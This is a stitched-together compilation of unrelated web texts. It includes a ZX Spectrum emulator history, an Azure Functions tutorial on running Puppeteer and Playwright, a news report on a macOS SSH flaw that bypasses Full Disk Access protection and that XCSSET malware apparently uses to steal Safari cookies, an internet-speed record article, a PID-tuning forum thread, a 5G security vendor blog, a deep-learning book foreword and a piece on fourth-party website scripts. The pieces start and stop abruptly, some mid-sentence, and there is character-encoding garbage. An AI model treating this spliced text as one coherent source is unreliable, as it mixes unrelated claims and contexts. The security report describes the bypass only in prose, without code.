job. In this release, utilities ZXTOOLS and ZXSHELL are not separate tools. Instead, they
are integrated into the environment of the emulator.

Release 2.0 was developed in much better conditions. The war is finished, but the
economical situation is terrible. Our payments was under 50 DM. However, Zeljko
succeed to purchase faster computer, and he finally had goal to develop accurate speed
version of the Warajevo kernel. So, we worked on Pentium 133 MHz/1.2 Gb disc and Pentium
100 MHz/1.6 Gb hard disc, both
with 16 Mb of RAM, Sound Blaster cards and VGA graphic card (this is mainly our today
configuration too). First real-time release of Warajevo, release 2.0, was uploaded in
February 1998. As you can see, Warajevo 2.0 is
uploaded after a long delay (about nearly 1.5 year) from previous release. This is mainly consequence of
adaptation to post-war conditions. Finishing of the war brings a lot of new problems
which took a lot of our time, so developing of the emulator was stopped for a while...

The last release of Warajevo is currently Warajevo 2.51. Recently, a number of new
emulators have appeared. Some of them are very good, especially X128 by James McKay,
and there are a number of emulators for the Windows platform (we want to point out ZX32
by Vaggelis Kapartzianis and MultiMachine by Paul Hodgson). However, we still think that
Warajevo 2.51. is the best emulator for pure DOS. We want to tell you that
the Warajevo emulator still does not have a good emulation of the video
system like in the ZX32 emulator (although it is much better than in release
2.0. which was a considerable improvment itself over release 1.5.), perfect
emulation of the bits 3 and 5 in the F register, emulation of the disc
interfaces, Multiface 128, AMX mouse, full emulation of the RS232 socket or
emulation of the Spectrum +3, which are supported in some other emulators.
However, we want to emphasize that Warajevo still has a lot of features which make it
unique. For more details see:

Well, what do you think, after this story, about today MS Windows programs that
require 100 Mb for relative simple task??? Obviously, the Spectrum times were the
best computer times. Nowadays, for playing a game in a PC you need a Pentium 200 MHz,
32 Mb of RAM and a fast graphic card. If you haven't got these requirements, you can`t
play the game. But, with the Spectrum everything was quite different. The Spectrum
wasn't upgradeable and the programmers had to make big efforts to develope a very good
game. And the games were also cheaper than the PC ones...

                <p>With a recent update to Azure Functions, it is now possible to run headless Chromium in the Linux Consumption plan. This enables some serverless browser automation scenarios using popular frameworks such as <a href="https://github.com/puppeteer/puppeteer">Puppeteer</a> and <a href="https://playwright.dev/">Playwright</a>.</p>

<h2>Browser automation with Puppeteer and Playwright</h2>

<p>Browser automation has been around for a long time. Selenium WebDriver was a pioneer in this space. More recently, Puppeteer and Playwright have gained in popularity. The two frameworks are very similar. Google maintains Puppeteer and Microsoft maintains Playwright. It's interesting to note that some of the folks who worked on Puppeteer are now working on Playwright.</p>

<p>Puppeteer and Playwright each support a different set of browsers. Both of them can automate Chromium. They automatically install Chromium and can use it without extra configuration.</p>

<h2>Azure Functions support for headless Chromium</h2>

<p>It's been a challenge to run headless Chromium on Azure Functions, especially in the Consumption (serverless) plan. Until now, the only way to run it has been by using a custom Docker image on the Premium plan.</p>

<p>Very recently, the necessary dependencies to run headless Chromium were added to the Azure Functions Linux Consumption environment. This means that we can simply <em>npm install</em> Puppeteer or Playwright in a Node.js function app to start using one of those frameworks to interact with Chromium.</p>

<h2>Use Puppeteer and Playwright in Azure Functions</h2>

<p>It's pretty straightforward to run either Puppeteer or Playwright in Azure Functions. We use npm to install it. Note that because it is needed at run-time, we should install the package as a production dependency. In the examples below, we use Puppeteer/Playwright with headless Chromium in an HTTP triggered function to open a web page and return a screenshot.</p>

<p>For the full source, take a look at <a href="https://github.com/anthonychu/functions-headless-chromium">this repo</a>. When we run the function app locally and visit <code>http://localhost:7071/api/screenshot?url=https://bing.com/</code>, we get back a screenshot of the page.</p>

<h2>Deploy to Azure</h2>

<p>Since we're deploying to a Linux environment, we have to make sure we run <em>npm install</em> in Linux so it downloads a version of Chromium that matches the deployment target. Thankfully, Azure Functions supports remote build so that the app is built in the correct Linux environment during deployment, even though we might be developing locally in macOS or Windows.</p>

<h3>Configuring VS Code for remote build</h3>

<blockquote>
<p>If we are deploying using Azure Functions Core Tools, we can skip this step.</p>
</blockquote>

<p>By default, the Azure Functions VS Code extension will deploy the app using local build, which means it'll run <em>npm install</em> locally and deploy the app package. For remote build, we update the app's <em>.vscode/settings.json</em> to enable <code>scmDoBuildDuringDeployment</code>.</p>
<div><pre><code data-lang="json"><span>{</span><span>
    </span><span>"azureFunctions.deploySubpath"</span><span>:</span><span> </span><span>"."</span><span>,</span><span>
    </span><span>"azureFunctions.projectLanguage"</span><span>:</span><span> </span><span>"JavaScript"</span><span>,</span><span>
    </span><span>"azureFunctions.projectRuntime"</span><span>:</span><span> </span><span>"~3"</span><span>,</span><span>
    </span><span>"debug.internalConsoleOptions"</span><span>:</span><span> </span><span>"neverOpen"</span><span>,</span><span>
    </span><span>"azureFunctions.scmDoBuildDuringDeployment"</span><span>:</span><span> </span><span>true</span><span>
</span><span>}</span><span>
</span></code></pre></div>
<p>We can also remove the <code>postDeployTask</code> and <code>preDeployTask</code> settings that runs npm commands before and after the deployment; they're not needed because we're running the build remotely.</p>

<p>And because we're running <em>npm install</em> remotely, we can add <code>node_modules</code> to <em>.funcignore</em>. This excludes the <em>node_modules</em> folder from the deployment package to make the upload as small as possible.</p>

<h3>Creating a Linux Consumption function app</h3>

<p>We can use any tool, such as the Azure Portal or VS Code, to create a Node.js 12 Linux Consumption function app in Azure that we'll deploy the app to.</p>

<h3>Configuring Chromium download location (Playwright only)</h3>

<p>By default, Playwright downloads Chromium to a location outside the function app's folder. In order to include Chromium in the build artifacts, we need to instruct Playwright to install Chromium in the app's <em>node_modules</em> folder. To do this, create an app setting named <code>PLAYWRIGHT_BROWSERS_PATH</code> with a value of <code>0</code> in the function app in Azure. This setting is also used by Playwright at run-time to locate Chromium in <em>node_modules</em>.</p>

<h3>Publishing the app</h3>

<p>If using VS Code, we can use the <em>Azure Functions: Deploy to Function App...</em> command to publish the app. It'll recognize the settings we configured earlier and use remote build.</p>

<p>If using Azure Functions Core Tools, we need to run the command with the <code>--build remote</code> flag:</p>
<div><pre><code data-lang="bash">func azure functionapp publish <span>$appName</span> <span>--build</span> remote
</code></pre></div>
<p>And that's it! We've deployed a consumption Azure Functions app that uses Puppeteer or Playwright to interact with Chromium!</p>

<p>A privacy bug lurking around in Apple Mac OS X since at least 2018 continues to remain unpatched.</p>



<p>The severity of the bug could be considered <em>moderate</em>, as the attacker would first need to establish an SSH connection to the system. However, it forms one of the Improper Authorization exploits actively leveraged by the <a href="https://blog.trendmicro.com/trendlabs-security-intelligence/xcsset-mac-malware-infects-xcode-projects-performs-uxss-attack-on-safari-other-browsers-leverages-zero-day-exploits/" target="_blank" rel="noreferrer noopener">XCSSET Mac Malware</a>, described in <em>TrendMicro’s</em> report.</p>



<p>XCSSET malware targets XCode projects, altering them in such a way, that they execute malicious code on building. </p>



<p>In a technical brief PDF provided by <em>TrendMicro</em>, the “Data Vault vulnerability used in Safari cookie theft” specifically refers to this very SSH vulnerability. </p>



<p>The bug was previously discovered and reported by Howard Oakley in his <a href="https://eclecticlight.co/2018/11/12/who-put-that-in-my-full-disk-access-list-ssh-and-mojaves-privacy-protection/" target="_blank" rel="noreferrer noopener">blog</a> post titled <em>“Who put that in my Full Disk Access list?”</em></p>



<p>In fact, security engineer Mikey (<a href="https://twitter.com/0xmachos/status/1296064717098811392" target="_blank" rel="noreferrer noopener">0xmachos</a>) wasted no time in calling out <em>TrendMicro</em> for not referencing Oakley in their report.</p>



<figure></figure>



<p>Oakley explained how in certain cases, macOS would automatically give <code>ssh</code> <strong>Full Disk Access </strong>to a connected user, effectively bypassing their privacy settings.</p>



<figure><img loading="lazy" src="https://eclecticlightdotcom.files.wordpress.com/2020/08/ssh02.jpg?w=940" alt="ssh02" width="580" height="509"><figcaption><strong>macOS Full Disk Access list contains “sshd-keygen-wrapper” and “sshd”</strong><br>Source: EclecticLight blog</figcaption></figure>



<p>Typically, macOS systems are in one of the three states, with regards to SSH access:</p>



<ul><li>they were never accessed over SSH. Therefore, the&nbsp;<code>sshd-keygen-wrapper</code>&nbsp;entry is not present in the&nbsp;<strong>Full Disk Access</strong>&nbsp;list, <strong>or</strong><br></li><li>have been accessed over SSH with Full Disk Access permission granted, due to&nbsp;<code>sshd-keygen-wrapper</code>&nbsp;being listed and ticked, <strong>or</strong><br></li><li>accessed over SSH but permissions were now removed, with&nbsp;<code>sshd-keygen-wrapper</code>&nbsp;listed under Full Disk Access but <strong>not ticked</strong>.</li></ul>



<p>“It is only when&nbsp;<strong>Privacy</strong>&nbsp;settings are in the last state that access to protected data will be refused. The only control that the user has is enabling and disabling the&nbsp;<code>sshd-keygen-wrapper</code>&nbsp;in the&nbsp;<strong>Full Disk Access</strong>&nbsp;list, which has the effect of toggling access to protected data for that user,” stated Oakley in his original blog post.</p>



<p>Moreover, removing the <code>sshd-keygen-wrapper</code> from the Full Disk Access list didn’t prevent access to protected data at all!</p>



<div><p>This means, ideally when in the first state, macOS should<em> by default</em> <em>prevent</em> granting access to areas specified by “sshd-keygen-wrapper,” should the setting had been ticked. But that isn’t the case.</p><p>Unchecking “sshd-keygen-wrapper” from the list is acceptable, and works as intended. But removing it altogether will actually add it back into the list in a “ticked” state.</p></div>



<h2>Consequences? Exploited at large.</h2>



<p>This means a user accessing macOS over SSH will now have full permissions and privileges offered as if this option was ticked. This directly concerns the user’s privacy.</p>



<p>“To gain full access to any privacy-protected directory, all an attacker has to do is establish an ssh connection. Provided Remote Login is enabled, and <code>sshd-keygen-wrapper</code> <strong>isn’t both present and disabled (unticked)</strong> in the Full Disk Access list, macOS will automatically bypass its own privacy protection without any further control,” states Oakley in his latest <a href="https://eclecticlight.co/2020/08/20/the-vulnerability-in-remote-login-ssh-persists/" target="_blank" rel="noreferrer noopener">post</a>.</p>



<p>This behaviour can be exploited by malware and sophisticated “vulnerability chaining” exploits to steal sensitive files, such as Safari browser cookies.</p>



<figure><img loading="lazy" width="1024" height="712" src="https://securityreport.com/wp-content/uploads/2020/08/image-2-1024x712.png" alt="" srcset="https://securityreport.com/wp-content/uploads/2020/08/image-2-1024x712.png 1024w, https://securityreport.com/wp-content/uploads/2020/08/image-2-300x209.png 300w, https://securityreport.com/wp-content/uploads/2020/08/image-2-768x534.png 768w, https://securityreport.com/wp-content/uploads/2020/08/image-2.png 1248w" sizes="(max-width: 1024px) 100vw, 1024px" data-srcset="https://securityreport.com/wp-content/uploads/2020/08/image-2-1024x712.png 1024w, https://securityreport.com/wp-content/uploads/2020/08/image-2-300x209.png 300w, https://securityreport.com/wp-content/uploads/2020/08/image-2-768x534.png 768w, https://securityreport.com/wp-content/uploads/2020/08/image-2.png 1248w" data-src="https://securityreport.com/wp-content/uploads/2020/08/image-2-1024x712.png" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></figure>



<p>“macOS protects the Safari cookie file <code>~/Library/Cookies/Cookies.binarycookies</code> with the System Integrity<br>Protection (SIP) feature. However, we found a bypass method when analyzing the malware’s <code>safari_cookie</code> module. It is a zero-day vulnerability exploitation that is at large,” reads <em>TrendMicro’s</em> technical brief on XCSSET.</p>



<h2>Remediating what’s <em>not a “zero-day”</em></h2>



<p>While <em>TrendMicro</em> refers to this vulnerability as a “zero-day,” not all experts agree.</p>



<p>For example, Thomas Reed, Director of Mac and Mobile at Malwarebytes told <em><a href="https://portswigger.net/daily-swig/apple-security-sophisticated-mac-malware-targets-developers" target="_blank" rel="noreferrer noopener nofollow">The Daily Swig</a></em>:</p>



<p>“The Data Vault vulnerability is definitely not a zero-day, as it’s been known for a couple of years that using SSH/SCP bypasses TCC restrictions. This is a known issue, but it’s been known since 2018 and may, at this point, be something that Apple considers to be working as intended.”</p>



<p>Oakley’s recommendation advice comes in two measures which would make it harder for attackers to exploit this bug:</p>



<p>“Disable <strong>Remote Login</strong> and ensure that <code>sshd-keygen-wrapper</code> has been added to your Mac’s <strong>Full Disk Access</strong> list but is <strong>unticked</strong> there.”</p>



<p>Until Apple patches this privacy <em>omission</em> in their OS X builds, the vulnerability may continue to be exploited as a part of advanced attacks on Apple systems.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-10413"><div><div><div><h2>UCL engineers set new world record internet speed by achieving a mindboggling 178,000Gbps speed aka 178Tbps</h2><p>The current generation thrives on the Internet and its speed. The normal speed we have in our home is about 10 to 100Mbps but just imagine what will happen if you have a download speed of 178,000 gigabits per second on your home Wi-Fi network. You could download the entire Netflix library of movies/serials and TV shows in just under a second. Mind-blowing isn’t it!</p><p>Researchers from University College London have achieved the impossible speed of 178Tbps during their research. The importance of UCL researchers’ achievement can be surmised from the fact that the current optical fiber-enabled data centers are capable of transmitting data at speeds of 35Tbps. The existing world record for maximum Internet speed was set by an Australian research team at 44.2Tbps in May this year. But all these records pale in light of the mind-boggling speed that UCL researchers have achieved.</p><p>A team of researchers from University College London led by Dr. Lidia Galdino in collaboration with Xtera and KDDI Research has succeeded in achieving 4 times the speed of Australian researchers’ earlier world record.</p><p>The researchers have published a <a href="https://www.ucl.ac.uk/news/2020/aug/ucl-engineers-set-new-world-record-internet-speed">blog post</a> explaining how they achieved the world record Internet speed of 178,000Gbps. The researchers say that they used wavelengths much wider than those used in existing fiber optic systems and a spectral bandwidth of 16.8 THz. To understand the bandwidth used by the researchers, we can compare it with the currently used networks which use 4.5 THz bandwidth. The next-gen 9THz bandwidth is just being implemented in some parts of the world.</p><p>To achieve this spectral bandwidth, the researchers combined different amplifier technologies needed to boost the signal power over this wider bandwidth and maximized speed by developing new Geometric Shaping (GS) constellations or patterns of signal combinations that make the best use of the phase, brightness and polarization properties of the light. They were able to manipulate the properties of each individual wavelength to get the desired spectrum. By using a system-tailored set of geometrically shaped constellations, the UCL engineers demonstrated the transmission of 660 ×25 GBd channels over 40 km, resulting in a record single-mode fiber net throughput of 178.08 Tbit/s.</p><p>The researchers say that the data transmission rate of 178 terabits a second (178,000,000 megabits a second) could take less than an hour to download the data that made up the world’s first image of a black hole (which, because of its size, had to be stored on half a ton of hard drives and transported by plane).</p><p>Interestingly the Internet transmission speed achieved by UCL researchers is very close to the theoretical limit for data transmission given by the American mathematician Claude Shannon in 1949.</p><p>While the earlier research was limited to labs, UCL research could actually be commercialized says Dr.Gadlino, “While current state-of-the-art cloud data-center interconnections are capable of transporting up to 35 terabits a second, we are working with new technologies that utilize more efficiently the existing infrastructure, making better use of optical fiber bandwidth and enabling a world record transmission rate of 178 terabits a second.”</p><p>The UCL team’s research was funded by the Royal Academy of Engineering, The Royal Society Research Grant, and the EPSRC program grant. The team has written a research paper on their achievement called the <a href="https://ieeexplore.ieee.org/abstract/document/9144561"><strong>IEEE Photonics Technology Letters</strong></a>.

<p>Hi</p>
<p>I would appreciate you help to undertake a useful test of your site. I have a RTK GPS differential drive robot that uses pure persuite controller to steer to a track between waypoints. It uses the error between the aimpoint and actual gps heading. We record lates longs and many other data values. We drive the robot by applying different wheel speeds to the drive wheels. We use a hardware controlled close loop PID to ensure the wheels drive at the correct speed.. We also measure the cross track error but we do not use this as yet in the actual controller. What specific data do we need for your simulator to worl</p>

<p>Hi,</p>
<p>I am guessing you mean how to obtain the input/output data required in the first step of the PID Tuner.</p>
<p>If that is the case, then you need to find where the PID code is executed (if is a PLC then find the PID block). Then record:</p>
<p>The&nbsp;output&nbsp;of the PID block is what the PID Tuner needs for the&nbsp;input&nbsp;column.<br>
The&nbsp;input&nbsp;of the PID block (which is the process measurement) is what the PID Tuner needs for the&nbsp;output&nbsp;column.<br>
The&nbsp;time&nbsp;of the experiment.<br>
As you see input and output are&nbsp;inverted&nbsp;between the PID block and what the Tuner expects.</p>
<p>Now to obtain the experiment data : With the PID block&nbsp;turned off, execute an experiment by making a manual step change on the PID output (what would be the Tuner input) and record all the data of that experiment. If you can make more steps, the better. Try steps up and down if possible. Then load that data into the PID Tuner.</p>
<p>Once you load that data, save your project and share your link here, so I can further assist you.</p>

<p>Many thanks for your reply. I am looking forward to getting my data into your tuner as I am sure I will then get a better understanding of the whole system. Currently I do have quite a few gaps in my control theory knowledge</p>

<p>I am enclosing a data file that we record from each robot mission.</p>
<p>I am also enclosing 2 drawing to explain what we are attempting to do with the pure pursuit PID We first start with 2 waypoints. The robot calculates the heading to a point on the straight line between the 2 way points at is a fixed distance from the robot. As the robot moves the aim point is continuously recalculated.</p>
<p>We then calculate a heading to this aimpoint and from the RTK dual antenna gps we determing an accurate heading of the robot. The difference in the angle between the aimpoint and the gps heading (error) is fed into the PID controller on an Arduino Due.</p>
<p>The output of the controller is a turnSpeed. This turnSpeed is then added to a constant forwardSpeed of 550 to formulate a left and right wheel speed. So if both L and R wheel speeds are 550 the robot drives straight. As the turnspeed increases in one direction so does the differential between the 2 wheels speeds. The wheelspeeds are fed to the Roboteq MDC2230 motor controller with a number from -1000 to +1000 and this generates a voltage to the wheel motors. The application of the differential voltage caused the robot to drive forward and if required drive in a direction to reduce the error between the Aimpoint and GPS to ZERO</p>

<p>So the input to the controller is the difference between aimpoint and gps heading The output of the PID controller is a turnSpeed which is modified to by 2 wheelspeeds.</p>
<p>These wheelspeeds then cause the robot to drive in some direction until the whole system is updated</p>

<p>The loop time for the PID is 5 Hz. We print the data for the excel every second however we can increase that to 5 Hz as well</p>

<p>If you can use the info I have provided to help me select the correct data for your tuning model I would be very grateful.</p>

<p>Also not sure how to do a step impulse for this system. A little clarity on this will also be appreciated.</p>

<p>Hi,</p>
<p>The input to the pidtuner should be the “TurnSpeed” and the output should be the “GPS Heading”. I tried to import your data to the pidtuner using the “Loop Timer” as the time, but divided by 1000 to get the seconds.</p>
<p>Sadly your data does not contain clean manual steps on the input (TurnSpeed). These should be performed in open-loop (PID turned off). Some steps up and down while recording the output (GPD Heading).</p>
<p>Still the pidtuner gave somewhat of a match, see the following link:</p>
<p><a href="https://pidtuner.com/#/0eDJOt49JM" rel="nofollow">https://pidtuner.com/#/0eDJOt49JM</a></p>

<p>I would try some conservative PID gains first like the ones shown in the link, then if it works, move the slider right to mak the PID gains gradually more agressive.</p>
<p><img src="https://forum.pidtuner.com/wp-content/uploads/hm_bbpui/47/8to1jdamx8sbwggmptgrtpwfue631v1n.PNG" alt="Conservative PID gains"></p>
<p>Still the bets thing to do would be to repeat the experiment, providing some clean steps on the “TurnSpeed”.</p>

<p>Really appreciate your assistance. Please continue to have patience with me as I am new to all this. I want to continue as I want to learn as much about this as possible</p>
<p>OK The purpose of this robo is to drive a predetermined course. The coirse consists of parallel tracks separated by the width of the robot. The spreadsheet that I enclosed was based on a autonomously operated robot mission driven by a microprocessor. The steering is controlled by a pure persuit PID. The input to the PID is GPS-Aim point heading (or other way round I can not remember) and the output is as you said turnSpeed. The turnspeed is then approtioned to the left and right wheels, If the error between the GPS and AIM point is 0 then turnspeed is 0 and the robot drives straight at the constant forward speed of 550. if the error is plus or minus and is non zero the robot will turn to the left or right as turnSpeed will be also non 0.</p>
<p>The robot is supposed to drive between 2 way points marked as A and B in the drawings. This is the desired track.&nbsp; We measure the cross track error and is is the distance the robot is off the desired track. Currently the cross track error (CTE) is not used in a PID to further reduce the error and to get the robot to better follow the desired track.</p>
<p>I am trying to think of a way to give you useful data manually. Currently the only way to drive between the 2 wp is in auto mode with the microprocessor generating the turn commands.In manual mode the desired track is virtual.&nbsp; I do have a manual mode it is when the robot is controlled by an rc transmitter. In this mode I can drive the robot in any direction and I can make any turn I like. However in this mode we are not generating the aim pint so I can not determine the error (aimpoint -gps heading)</p>
<p>I could lay down some string and manually drive along the string and make manual turns off the desired track and see what is obtained.&nbsp; So help would be needed to further define what is required</p>
<p>I also could set up a long line mission and then in manual drive the robot off the desired track by a fixed amount and then switch to auto so the the robot will try to get back onto the line. I would try point the robot 5 degre then 10 the 20 degrees from where I think the ain point would be,</p>
<p>I am happy to run any experiment that you think will work.</p>
<p>I also do not have a clue regarding what model to choose?</p>
<p>To date I have been using the following gains</p>
<p>D5 is the look ahead distance</p>
<p>purePursuitD5 = 2.0<br>
purePursuitKp = 0.75<br>
purePursuitKi = 0.025<br>
purePursuitKd = 0</p>

<p>currently the gps is updating at 5hz. So the microprocessor loop time is also 5 hz. If you want me to record the mission data I can do this at 5hz or anything lower like 1 hz</p>

<p>looking at your site in detail.</p>
<p>The data in the output grapg the data is the gps heading only.</p>
<p>The data in the input graph is turnSpeed.</p>
<p>In our program is is the error between the aim point on the desired track – the gps heading is generating the turnSpeed and not the gps by itself.</p>
<p>In section select a setp. You have selected what we call the pivot this is when the robot to two 90 degree turns with a short 20 inch straight section to move to the next lane.</p>
<p>We are more interested in the longer straight tracks between the pivots, These trcks are about 60 ft long and we want the robot to not wonder off the straight line in between. Currently we can control the robot to be +-5cm from the desired line. We want to see if we can reduce this cross track error CTE even further. Ie that the robot drives even straighter.</p>
<p>In section 3 I have not clue as to which model to select. I normally use Brett Beauregards PID library and we tune for Kp Ki Kd</p>
<p>I am not sure about the other form of the PID equation that uses a general gain and Time constants approach.</p>

<div>

<div>
<p>In the spreadsheet the GPS heading is in column I</p>
<p>AimPoint is in column O</p>
<p>the error for the PID is either I-o or O-I can not remember I minus will make a turn one way and a + will make a turn the other way</p>
<p>The error will generate a turnspeed as recorded in column&nbsp; U.</p>
<p>This is then apportioned (added and subtracted ) to the left and right wheel speeds ie with a constant forward speed of 550.</p>
<p>the robot drives and then we calculate the error in cross track ie the CTE. This value is not currently feedback as we only use the aimpoint gps error.</p>
<p>Shortly we are going to implement a separate PID to be totally comtrolled by the CTE.</p>
<p>Eventually we may use both PID’s cross track and pure persuit, At the moment we are still learning and a combo could be one step to far</p>

<p>Assuming you have setup your hardware correctly, the PID controller does not care about the details of all of it. To tune the PID controller, we just need a simplified “<strong>model</strong>” for <strong>everything</strong> that is <strong>outside</strong> of the PID controller. So for a moment, please forget about your hardware details, and think as if you were the PID controller and know nothing about what is outside.</p>

Now, just as 4G is becoming irrelevant for users and businesses, 5G is introduced.Â&nbsp;</span></p><p><span>Since its emergence, 5G has taken the world by storm. The global phenomenon of quicker networks has everyone buzzing, especially tech companies. 5G offers companies faster and more reliable internet, with lower latency issues for their employees — no matter where they are or what device they use.Â&nbsp;</span></p><p><span>As 5G is rolling out in the United States and companies are already reaping its benefits, enterprise networking is still in the early stages of the 5G revolution. The transformation of mobile networks comes with risks that cannot be ignored. Instead of solely focusing on the numerous benefits 5G offers, such as a redesign of mobile networks which enables efficiency, cost-effectiveness and greater agility, we need to also be aware of the new security challenges that come with developing and implementing this new infrastructure.</span></p><h2><span>5G Security: An Ongoing Issue</span></h2><p><span>With new network technologies such as 5G, security needs to be more involved during the early stages of development. This wireless network evolution will see many different shifts occur as 5G moves from early-stage to the norm for mobile networks.Â&nbsp;</span></p><p><span>Mobile networks with security risks is not a new concept, yet the number of attacks from different endpoints is increasing as networks are transforming. Companies that are early adopters of 5G </span><span>networks could possibly experience security threats due to their implementation of an early-stage version of 5G.Â&nbsp;</span></p><p><span>Among the security challenges that 5G presents are visibility issues, increased exposure to attacks due to new entry points for bad actors, and increased risks from major dependencies on suppliers.</span></p><p><span>Network experts might recommend organizations not to implement technology that was designed for 5G networks as it comes with different security challenges. While this is taking a more cautious route, organizations need to rethink their entire security strategy when it comes to 5G networks. IT and security teams need to implement the right amount of security policies in place to secure their network for 5G. Without doubt risks and issues will happen with new technology but having a security strategy implemented will veer away from simpler security challenges that can occur with 5G.Â&nbsp;</span></p><h2><span>5G Security Challenges Arenâ€™t a Quick Fix</span></h2><p><span>When organizations are designing their network security strategy, IT and security teams are continuously taking the same approach, how quickly can we patch vulnerabilities while updating the network at the same time? Instead, organizations need to look at the entire security strategy, not just a quick fix.Â&nbsp; One security risk often overlooked is testing new networks during the implementation period. </span><a href="https://www.perimeter81.com/solutions/role/it-managers"><span>IT teams</span></a><span> will regularly run a group of network tests that check for common vulnerabilities and risks in the network. Once the tests are completed, the networks can be implemented.</span></p><p><span>Adopting the â€˜set it and forget itâ€™ approach when it comes to testing creates another challenge of its own. Without continuously testing your network for vulnerabilities and security risks you are putting your network at risk.Â&nbsp;</span></p><p><span>IT experts might suggest that when first implementing new networks, your infrastructure needs to properly communicate and pass data from network to network. Additionally, you need to properly integrate the </span><a href="https://www.perimeter81.com/blog/network/gartner-sase-transforming-network-security/"><span>network security</span></a><span> from your 4G networks to your new 5G networks. If this is not done correctly, your organization could experience major network security risks that could harm the security of your infrastructure and networks.Â&nbsp;Â&nbsp;</span></p><p><span>Some organizations will try to fix 5G security challenges with the latest security solutions, even if they are not designed for 5G infrastructures and networks. These solutions could be a quick band-aid for your 5G networks but once your networks are implemented, the security challenges will become more obvious. With the wrong solution in place, it can create more endpoints and entry points for hackers to infiltrate. Instead of adopting different solutions for your network, organizations should implement a 5G friendly secure network access solutions to dissolve the potential security challenges.Â&nbsp;</span></p><h2><span>5G allows Smoother Secure Network AccessÂ&nbsp;</span></h2><p><span>As more and more organizations start to adopt 5G networks, they will experience the different benefits they offer such as quicker communication and low-cost deployment. These network benefits will enable their employees to connect and send more data to their network. However by more devices quickly connecting and transferring large amounts of data it can put a massive strain on IT and security teams when ensuring that their organization is connecting securely to the networks.Â&nbsp;</span></p><p><span>To ensure that the entire organization is connecting securely to the new networks, IT and security teams should look to adopt models that are designed to make sure that the proper employees gain access to the network. One such model is </span><a href="https://www.perimeter81.com/zero-trust-network-access"><span>Zero Trust Network Access</span></a><span> (ZTNA).Â&nbsp;</span></p><p><span>The Zero Trust Network Access model has gained popularity with organizations of all sizes since the rise of cloud adoption. While Zero Trust Network Access is not a new approach, it has become one of the more popular models to implement when fighting security risks that 5G present.

<p>In a very short time, deep learning has become a widely useful technique, solving and automating problems in computer vision, robotics, healthcare, physics, biology, and beyond. One of the delightful things about deep learning is its relative simplicity. Powerful deep learning software has been built to make getting started fast and easy. In a few weeks, you can understand the basics and get comfortable with the techniques.</p>

<p>This opens up a world of creativity. You start applying it to problems that have data at hand, and you feel wonderful seeing a machine solving problems for you. However, you slowly feel yourself getting closer to a giant barrier. You built a deep learning model, but it doesn’t work as well as you had hoped. This is when you enter the next stage, finding and reading state-of-the-art research on deep learning.</p>

<p>However, there’s a voluminous body of knowledge on deep learning, with three decades of theory, techniques, and tooling behind it. As you read through some of this research, you realize that humans can explain simple things in really complicated ways. Scientists use words and mathematical notation in these papers that appear foreign, and no textbook or blog post seems to cover the necessary background that you need in accessible ways. Engineers and programmers assume you know how GPUs work and have knowledge about obscure tools.</p>

<p>This is when you wish you had a mentor or a friend that you could talk to. Someone who was in your shoes before, who knows the tooling and the math–someone who could guide you through the best research, state-of-the-art techniques, and advanced engineering, and make it comically simple. I was in your shoes a decade ago, when I was breaking into the field of machine learning. For years, I struggled to understand papers that had a little bit of math in them. I had good mentors around me, which helped me greatly, but it took me many years to get comfortable with machine learning and deep learning. That motivated me to coauthor PyTorch, a software framework to make deep learning accessible.</p>

<p>Jeremy Howard and Sylvain Gugger were also in your shoes. They wanted to learn and apply deep learning, without any previous formal training as ML scientists or engineers. Like me, Jeremy and Sylvain learned gradually over the years and eventually became experts and leaders. But unlike me, Jeremy and Sylvain selflessly put a huge amount of energy into making sure others don’t have to take the painful path that they took. They built a great course called fast.ai that makes cutting-edge deep learning techniques accessible to people who know basic programming. It has graduated hundreds of thousands of eager learners who have become great practitioners.</p>

<p>In this book, which is another tireless product, Jeremy and Sylvain have constructed a magical journey through deep learning. They use simple words and introduce every concept. They bring cutting-edge deep learning and state-of-the-art research to you, yet make it very accessible.</p>

<p>You are taken through the latest advances in computer vision, dive into natural language processing, and learn some foundational math in a 500-page delightful ride. And the ride doesn’t stop at fun, as they take you through shipping your ideas to production. You can treat the fast.ai community, thousands of practitioners online, as your extended family, where individuals like you are available to talk and ideate small and big solutions, whatever the problem may be.</p>

<p>I am very glad you’ve found this book, and I hope it inspires you to put deep learning to good use, regardless of the nature of the problem.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h6><b>Fourth party apps on websites are commonly referred to as “the vendor’s vendor code”. Fourth-party apps may offer additional benefits, but at the same time they also carry a set of threats while running on your websites. For your users, they are all, first-parties.</b></h6>
<p><b><br>
In this article, we will refer to the threats that fourth-parties present to websites, from a cyber-security and privacy perspective.</b></p>
<p><em>Article updated: August 2020</em></p>
<p><img loading="lazy" src="https://www.reflectiz.com/wp-content/uploads/2019/07/Fourth-parties-1024X512-300x150.jpg" alt="" width="666" height="333" srcset="https://www.reflectiz.com/wp-content/uploads/2019/07/Fourth-parties-1024X512-300x150.jpg 300w, https://www.reflectiz.com/wp-content/uploads/2019/07/Fourth-parties-1024X512-768x384.jpg 768w, https://www.reflectiz.com/wp-content/uploads/2019/07/Fourth-parties-1024X512.jpg 1024w" sizes="(max-width: 666px) 100vw, 666px"></p>
<h4><b>Fourth-parties on Websites: a simple but risky supply-chain&nbsp;</b></h4>
<p><span>Most code today is no longer developed from scratch. It is based on open-source, “shelf” products and vendors who offer solutions that can integrate with other platforms. That makes everything faster and cost-effective. This is what created web third-parties and therefore therefore can be found almost anywhere third-parties are used.</span></p>
<p><span>Let’s look at your website as an example and see&nbsp; what happens there and what also happens at your vendors, who also have third-parties of their own. Every move or modification on your vendors’ vendors, can affect your site.&nbsp;</span></p>
<p><span>But tracking these modifications is rarely possible and the obvious problem in this case is lack of control and hence mitigating risks.&nbsp;&nbsp;</span></p>
<p><span>To begin with, let’s understand that in the user’s browser, a script – is a script. The meaning of it is that each running script can do almost anything to a webpage, including loading additional scripts, the Fourth-party scripts.</span></p>
<p><span>Even if you installed a third-party app&nbsp; from your most trusted partner, this script can do whatever it wants on the given page. As an example, we’ll use the most popular tag manager in the world, Google Tag Manager or GTM.&nbsp;</span></p>
<p><span>Behind the scenes, a tag manager is a smart third-party script with “credentials” to load additional scripts to a page or the website. In fact, we can now understand that a tag manager, this case GTM, is a loader of fourth-parties in an organized way. But this is just one example. In the real world every third-party can just load any fourth-party it wants to your website. Do we want GTM to load fourth-parties scripts? Well, yes. But what about the dozens of other tools that you had, did you also allow them?</span></p>

